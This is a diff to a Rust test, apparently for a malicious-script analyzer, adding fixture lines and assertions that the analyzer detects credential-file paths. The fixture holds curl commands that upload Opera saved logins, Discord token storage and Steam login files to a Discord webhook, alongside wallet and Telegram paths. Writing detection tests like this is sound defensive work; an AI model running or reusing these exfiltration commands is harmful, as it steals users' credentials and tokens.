@@ -10050,6 +10050,9 @@ $urlzip = "https://ps.example/stage.zip""#,
         let script = br#"set "walletPaths[Exodus]=AppData\Roaming\Exodus\exodus.wallet"
 set "tdataPath=C:\Users\puncher\AppData\Roaming\Telegram Desktop\tdata"
 set "chrome=C:\Users\puncher\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings"
+curl --silent --output /dev/null -F opera=@"C:\Users\puncher\AppData\Roaming\Opera Software\Opera Stable\Login Data" https://discord.com/api/webhooks/1/token
+curl --silent --output /dev/null -F level=@"C:\Users\puncher\AppData\Roaming\discord\Local Storage\leveldb\%%f" https://discord.com/api/webhooks/1/token
+curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" https://discord.com/api/webhooks/1/token
 "#;
         let report = analyze(script, &Config::default());
 
@@ -10060,6 +10063,12 @@ set "chrome=C:\Users\puncher\AppData\Local\Google\Chrome\User Data\Default\Local
                 "browser-extension-store",
                 r"Chrome\User Data\Default\Local Extension Settings",
             ),
+            (
+                "browser-cred-path",
+                r"Opera Software\Opera Stable\Login Data",
+            ),
+            ("discord-token-store", r"discord\Local Storage\leveldb\%%f"),
+            ("steam-credential-path", r"Steam\config\loginusers.vdf"),
         ] {
             assert!(
                 report.traits.iter().any(|t| matches!(
